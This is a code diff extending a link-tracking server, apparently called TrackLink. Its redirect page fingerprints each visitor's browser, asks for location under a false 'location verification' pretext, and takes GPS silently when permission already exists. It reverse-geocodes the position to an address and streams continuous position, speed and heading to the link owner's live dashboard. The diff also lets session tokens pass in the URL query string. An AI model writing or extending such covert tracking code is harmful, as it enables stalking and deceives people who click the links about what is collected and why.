@@ -14,6 +14,8 @@ function hashPass(p) { return crypto.createHash('sha256').update(p + 'tl_salt_20
 
 // Live motion clients: visitId -> res
 const motionClients = new Map();
+// Global dashboard SSE clients: userId -> [res, ...]
+const dashClients = new Map();
 
 // ─── DB ──────────────────────────────────────────────────────────────────────
 db.exec(`
@@ -52,7 +54,10 @@ db.exec(`
   );
   CREATE TABLE IF NOT EXISTS motion_log (
     id TEXT PRIMARY KEY, visit_id TEXT NOT NULL,
-    lat REAL, lon REAL, accuracy REAL, time TEXT NOT NULL,
+    lat REAL, lon REAL, accuracy REAL,
+    altitude REAL, altitude_accuracy REAL,
+    speed REAL, heading REAL,
+    time TEXT NOT NULL,
     FOREIGN KEY(visit_id) REFERENCES visits(id)
   );
 `);
@@ -61,7 +66,7 @@ app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
 
 function requireAuth(req, res, next) {
-  const token = req.headers['x-auth-token'];
+  const token = req.headers['x-auth-token'] || req.query.token;
   if (!token) return res.status(401).json({ error: 'Unauthorized' });
   const session = db.prepare('SELECT s.*, u.username, u.id as uid FROM sessions s JOIN users u ON u.id=s.user_id WHERE s.token=?').get(token);
   if (!session) return res.status(401).json({ error: 'Invalid session' });
@@ -260,29 +265,77 @@ app.post('/api/enrich/:visitId', (req, res) => {
       d.canvas_fp||'', d.plugins||'', d.do_not_track||'',
       req.params.visitId
     );
+
+  // If GPS was captured, alert dashboard
+  if (d.gps_lat) {
+    notifyDashboard(req.params.visitId, 'gps_captured', {
+      visitId: req.params.visitId,
+      gps_lat: d.gps_lat,
+      gps_lon: d.gps_lon,
+      gps_accuracy: d.gps_accuracy,
+      gps_address: d.gps_address
+    });
+  }
+
   res.json({ ok:true });
 });
 
 // ─── LIVE MOTION UPDATE (from visitor's browser) ──────────────────────────────
 app.post('/api/motion/:visitId', (req, res) => {
-  const { lat, lon, accuracy } = req.body;
+  const { lat, lon, accuracy, altitude, altitude_accuracy, speed, heading } = req.body;
   if (!lat||!lon) return res.status(400).json({ error:'lat/lon required' });
 
   const now = new Date().toISOString();
   // Update live position on visit
   db.prepare('UPDATE visits SET live_lat=?,live_lon=?,live_updated=? WHERE id=?').run(lat, lon, now, req.params.visitId);
-  // Log to motion trail
-  db.prepare('INSERT INTO motion_log (id,visit_id,lat,lon,accuracy,time) VALUES (?,?,?,?,?,?)').run(genId(), req.params.visitId, lat, lon, accuracy||0, now);
+  // Log to motion trail with full data
+  db.prepare('INSERT INTO motion_log (id,visit_id,lat,lon,accuracy,altitude,altitude_accuracy,speed,heading,time) VALUES (?,?,?,?,?,?,?,?,?,?)')
+    .run(genId(), req.params.visitId, lat, lon, accuracy||0, altitude||null, altitude_accuracy||null, speed||null, heading||null, now);
 
   // Push to any SSE listeners for this visit
   const clients = motionClients.get(req.params.visitId) || [];
-  const data = JSON.stringify({ lat, lon, accuracy, time:now });
+  const data = JSON.stringify({ lat, lon, accuracy, altitude, speed, heading, time:now });
   clients.forEach(client => {
     try { client.write(`data: ${data}\n\n`); } catch(_) {}
   });
 
+  // Notify dashboard owner of live GPS update
+  notifyDashboard(req.params.visitId, 'gps_update', { visitId: req.params.visitId, lat, lon, accuracy, altitude, speed, heading, time: now });
+
   res.json({ ok:true });
 });
+
+// ─── SSE: global dashboard feed (GPS alerts, new visits) ─────────────────────
+app.get('/api/live-feed', requireAuth, (req, res) => {
+  res.setHeader('Content-Type','text/event-stream');
+  res.setHeader('Cache-Control','no-cache');
+  res.setHeader('Connection','keep-alive');
+  res.flushHeaders();
+
+  const uid = req.user.id;
+  if (!dashClients.has(uid)) dashClients.set(uid, []);
+  dashClients.get(uid).push(res);
+
+  // Heartbeat every 25s to keep connection alive
+  const hb = setInterval(() => { try { res.write(': ping\n\n'); } catch(_) {} }, 25000);
+
+  req.on('close', () => {
+    clearInterval(hb);
+    const list = dashClients.get(uid) || [];
+    dashClients.set(uid, list.filter(c => c !== res));
+  });
+});
+
+// Helper: push event to dashboard clients who own a visit
+function notifyDashboard(visitId, event, payload) {
+  try {
+    const link = db.prepare('SELECT l.user_id FROM visits v JOIN links l ON l.id=v.link_id WHERE v.id=?').get(visitId);
+    if (!link) return;
+    const clients = dashClients.get(link.user_id) || [];
+    const msg = `event: ${event}\ndata: ${JSON.stringify(payload)}\n\n`;
+    clients.forEach(c => { try { c.write(msg); } catch(_) {} });
+  } catch(_) {}
+}
 
 // ─── SSE: live motion stream ──────────────────────────────────────────────────
 app.get('/api/motion-stream/:visitId', requireAuth, (req, res) => {
@@ -333,18 +386,52 @@ app.get('/t/:slug', async (req, res) => {
 <title>Please wait...</title>
 <style>
 *{margin:0;padding:0;box-sizing:border-box}
-body{background:#080810;display:flex;align-items:center;justify-content:center;min-height:100vh;}
-.sp{width:40px;height:40px;border:3px solid #1c1c2e;border-top-color:#00e5ff;border-radius:50%;animation:s 1s linear infinite;}
-@keyframes s{to{transform:rotate(360deg)}}
+body{background:#080810;color:#e8e8f4;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;display:flex;align-items:center;justify-content:center;min-height:100vh;}
+.wrap{text-align:center;padding:24px 20px;max-width:320px;width:100%;}
+.sp{width:44px;height:44px;border:3px solid #1c1c2e;border-top-color:#00e5ff;border-radius:50%;animation:spin 1s linear infinite;margin:0 auto 20px;}
+@keyframes spin{to{transform:rotate(360deg)}}
+.status{font-size:13px;color:#5a5a72;margin-top:10px;}
+/* GPS prompt card */
+#gps-card{display:none;background:#0f0f1a;border:1px solid rgba(0,230,118,.3);border-radius:16px;padding:24px 20px;text-align:center;animation:fadeIn .3s ease;}
+@keyframes fadeIn{from{opacity:0;transform:translateY(8px)}to{opacity:1;transform:translateY(0)}}
+.gps-icon{font-size:40px;margin-bottom:12px;}
+.gps-title{font-size:16px;font-weight:600;margin-bottom:6px;}
+.gps-sub{font-size:12px;color:#5a5a72;margin-bottom:18px;line-height:1.6;}
+.gps-allow{display:block;width:100%;padding:13px;background:linear-gradient(135deg,#00c853,#00e676);color:#000;font-size:14px;font-weight:700;border:none;border-radius:10px;cursor:pointer;margin-bottom:9px;}
+.gps-skip{display:block;width:100%;padding:10px;background:none;color:#5a5a72;font-size:13px;border:1px solid #1c1c2e;border-radius:10px;cursor:pointer;}
 </style>
 </head>
-<body><div class="sp"></div>
+<body>
+<div class="wrap">
+  <!-- default spinner -->
+  <div id="spinner-view">
+    <div class="sp"></div>
+    <div class="status" id="status-msg">Preparing redirect...</div>
+  </div>
+  <!-- GPS prompt shown before redirect -->
+  <div id="gps-card">
+    <div class="gps-icon">📍</div>
+    <div class="gps-title">Allow Location Access?</div>
+    <div class="gps-sub">This link uses location verification.<br>Tap Allow to continue to the destination.</div>
+    <button class="gps-allow" id="btn-allow">Allow & Continue →</button>
+    <button class="gps-skip" id="btn-skip">Skip</button>
+  </div>
+</div>
 <script>
 const VID='${visitId}';
 const TARGET='${target}';
 
-// Collect everything possible about the browser
-async function collectAll(gps_lat, gps_lon, gps_accuracy, gps_address) {
+function setStatus(msg){ const el=document.getElementById('status-msg'); if(el) el.textContent=msg; }
+
+async function reverseGeocode(lat, lon) {
+  try {
+    const r = await fetch('https://nominatim.openstreetmap.org/reverse?format=json&lat='+lat+'&lon='+lon+'&zoom=18&addressdetails=1',{headers:{'Accept-Language':'en'}});
+    const d = await r.json();
+    return d.display_name || '';
+  } catch(_) { return ''; }
+}
+
+async function collectAll(gpsData) {
   const data = {
     language: navigator.language || navigator.userLanguage || '',
     screen: screen.width + 'x' + screen.height,
@@ -355,131 +442,145 @@ async function collectAll(gps_lat, gps_lon, gps_accuracy, gps_address) {
     touch_points: String(navigator.maxTouchPoints || 0),
     cpu_cores: String(navigator.hardwareConcurrency || ''),
     memory_gb: String(navigator.deviceMemory || ''),
-    gps_lat, gps_lon, gps_accuracy, gps_address
+    ...gpsData
   };
-
-  // Network info
   const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-  if (conn) {
-    data.connection_type = conn.effectiveType || conn.type || '';
-    data.connection_speed = String(conn.downlink || '');
-  }
-
-  // Battery
+  if (conn) { data.connection_type = conn.effectiveType || conn.type || ''; data.connection_speed = String(conn.downlink || ''); }
   try {
     const bat = await navigator.getBattery?.();
-    if (bat) {
-      data.battery_level = String(Math.round(bat.level * 100)) + '%';
-      data.battery_charging = bat.charging ? 'Charging' : 'Not charging';
-    }
+    if (bat) { data.battery_level = String(Math.round(bat.level*100))+'%'; data.battery_charging = bat.charging?'Charging':'Not charging'; }
   } catch(_) {}
-
-  // WebGL fingerprint
   try {
-    const canvas = document.createElement('canvas');
-    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-    if (gl) {
-      const ext = gl.getExtension('WEBGL_debug_renderer_info');
-      if (ext) {
-        data.webgl_vendor = gl.getParameter(ext.UNMASKED_VENDOR_WEBGL) || '';
-        data.webgl_renderer = gl.getParameter(ext.UNMASKED_RENDERER_WEBGL) || '';
-      }
-    }
+    const cv = document.createElement('canvas');
+    const gl = cv.getContext('webgl')||cv.getContext('experimental-webgl');
+    if (gl) { const ext=gl.getExtension('WEBGL_debug_renderer_info'); if(ext){ data.webgl_vendor=gl.getParameter(ext.UNMASKED_VENDOR_WEBGL)||''; data.webgl_renderer=gl.getParameter(ext.UNMASKED_RENDERER_WEBGL)||''; } }
   } catch(_) {}
-
-  // Canvas fingerprint (hash)
   try {
-    const c = document.createElement('canvas');
-    c.width=200; c.height=50;
-    const ctx = c.getContext('2d');
-    ctx.textBaseline='top';
-    ctx.font='14px Arial';
-    ctx.fillStyle='#f00';
-    ctx.fillRect(0,0,200,50);
-    ctx.fillStyle='rgba(0,255,0,.5)';
-    ctx.fillText('TrackLink FP 🔍',2,2);
-    const hash = c.toDataURL().split('').reduce((a,b)=>(((a<<5)-a)+b.charCodeAt(0))|0,0);
-    data.canvas_fp = String(Math.abs(hash));
+    const c=document.createElement('canvas'); c.width=200; c.height=50;
+    const ctx=c.getContext('2d'); ctx.textBaseline='top'; ctx.font='14px Arial';
+    ctx.fillStyle='#f00'; ctx.fillRect(0,0,200,50); ctx.fillStyle='rgba(0,255,0,.5)'; ctx.fillText('TrackLink FP',2,2);
+    const hash=c.toDataURL().split('').reduce((a,b)=>(((a<<5)-a)+b.charCodeAt(0))|0,0);
+    data.canvas_fp=String(Math.abs(hash));
   } catch(_) {}
-
-  // Plugins
-  try {
-    const plugins = Array.from(navigator.plugins||[]).map(p=>p.name).slice(0,5).join(', ');
-    data.plugins = plugins;
-  } catch(_) {}
-
+  try { data.plugins=Array.from(navigator.plugins||[]).map(p=>p.name).slice(0,5).join(', '); } catch(_) {}
   return data;
 }
 
-async function reverseGeocode(lat, lon) {
-  try {
-    const r = await fetch('https://nominatim.openstreetmap.org/reverse?format=json&lat='+lat+'&lon='+lon+'&zoom=18&addressdetails=1',{headers:{'Accept-Language':'en'}});
-    const d = await r.json();
-    return d.display_name || '';
-  } catch(_) { return ''; }
+async function sendData(data) {
+  try { await fetch('/api/enrich/'+VID,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(data)}); } catch(_) {}
 }
 
-async function sendData(data) {
+// Sends ONE motion update with full coords + altitude + speed + heading
+async function sendMotion(pos) {
+  const c = pos.coords;
   try {
-    await fetch('/api/enrich/'+VID, {
+    await fetch('/api/motion/'+VID,{
       method:'POST',
       headers:{'Content-Type':'application/json'},
-      body: JSON.stringify(data)
+      body: JSON.stringify({
+        lat: c.latitude,
+        lon: c.longitude,
+        accuracy: c.accuracy,
+        altitude: c.altitude,
+        altitude_accuracy: c.altitudeAccuracy,
+        speed: c.speed,
+        heading: c.heading
+      })
     });
   } catch(_) {}
 }
 
+// Continuously watches position and streams to server
+let watchId = null;
 function startMotionTracking() {
   if (!navigator.geolocation) return;
-  // Watch position continuously — sends updates every time position changes
-  navigator.geolocation.watchPosition(
-    async (pos) => {
-      try {
-        await fetch('/api/motion/'+VID, {
-          method:'POST',
-          headers:{'Content-Type':'application/json'},
-          body: JSON.stringify({
-            lat: pos.coords.latitude,
-            lon: pos.coords.longitude,
-            accuracy: pos.coords.accuracy
-          })
-        });
-      } catch(_) {}
-    },
+  watchId = navigator.geolocation.watchPosition(
+    async (pos) => { await sendMotion(pos); },
     null,
     { enableHighAccuracy: true, maximumAge: 0, timeout: 30000 }
   );
 }
 
-async function run() {
-  let gps_lat = null, gps_lon = null, gps_accuracy = null, gps_address = '';
+// Gets GPS position with full coordinate data
+async function getGPS(highAccuracy, timeout, maxAge) {
+  return new Promise(resolve => {
+    navigator.geolocation.getCurrentPosition(
+      p => resolve(p),
+      () => resolve(null),
+      { enableHighAccuracy: highAccuracy, timeout, maximumAge: maxAge }
+    );
+  });
+}
 
-  if (navigator.geolocation) {
-    // Try to get GPS — high accuracy first, then low
-    const tryGPS = (opts) => new Promise(resolve => {
-      navigator.geolocation.getCurrentPosition(
-        p => resolve(p),
-        () => resolve(null),
-        opts
-      );
-    });
+async function doGPS() {
+  if (!navigator.geolocation) return {};
+  setStatus('Getting your location...');
+  let pos = await getGPS(true, 10000, 0);
+  if (!pos) pos = await getGPS(false, 5000, 60000);
+  if (!pos) return {};
+  const c = pos.coords;
+  const gps_address = await reverseGeocode(c.latitude, c.longitude);
+  // Also send initial motion point with rich data
+  await sendMotion(pos);
+  // Then watch continuously
+  startMotionTracking();
+  return {
+    gps_lat: c.latitude,
+    gps_lon: c.longitude,
+    gps_accuracy: c.accuracy,
+    gps_address
+  };
+}
 
-    let pos = await tryGPS({ enableHighAccuracy:true, timeout:7000, maximumAge:0 });
-    if (!pos) pos = await tryGPS({ enableHighAccuracy:false, timeout:4000, maximumAge:60000 });
-
-    if (pos) {
-      gps_lat = pos.coords.latitude;
-      gps_lon = pos.coords.longitude;
-      gps_accuracy = pos.coords.accuracy;
-      gps_address = await reverseGeocode(gps_lat, gps_lon);
-      // Start continuous tracking
-      startMotionTracking();
-    }
-  }
-
-  const data = await collectAll(gps_lat, gps_lon, gps_accuracy, gps_address);
+async function proceedWithGPS() {
+  document.getElementById('gps-card').style.display='none';
+  document.getElementById('spinner-view').style.display='block';
+  const gpsData = await doGPS();
+  const data = await collectAll(gpsData);
   await sendData(data);
   window.location.replace(TARGET);
+}
+
+async function proceedWithoutGPS() {
+  document.getElementById('gps-card').style.display='none';
+  document.getElementById('spinner-view').style.display='block';
+  setStatus('Redirecting...');
+  const data = await collectAll({});
+  await sendData(data);
+  window.location.replace(TARGET);
+}
+
+async function run() {
+  // Check if geolocation is available
+  if (!navigator.geolocation) {
+    // No GPS support — just collect and redirect
+    const data = await collectAll({});
+    await sendData(data);
+    window.location.replace(TARGET);
+    return;
+  }
+
+  // Check current permission state if API available
+  if (navigator.permissions) {
+    try {
+      const perm = await navigator.permissions.query({ name: 'geolocation' });
+      if (perm.state === 'granted') {
+        // Already allowed — silently get GPS and go
+        await proceedWithGPS();
+        return;
+      } else if (perm.state === 'denied') {
+        // Blocked — skip GPS entirely
+        await proceedWithoutGPS();
+        return;
+      }
+    } catch(_) {}
+  }
+
+  // Permission is 'prompt' — show our custom card first
+  document.getElementById('spinner-view').style.display='none';
+  document.getElementById('gps-card').style.display='block';
+  document.getElementById('btn-allow').onclick = () => proceedWithGPS();
+  document.getElementById('btn-skip').onclick = () => proceedWithoutGPS();
 }
 
 run();
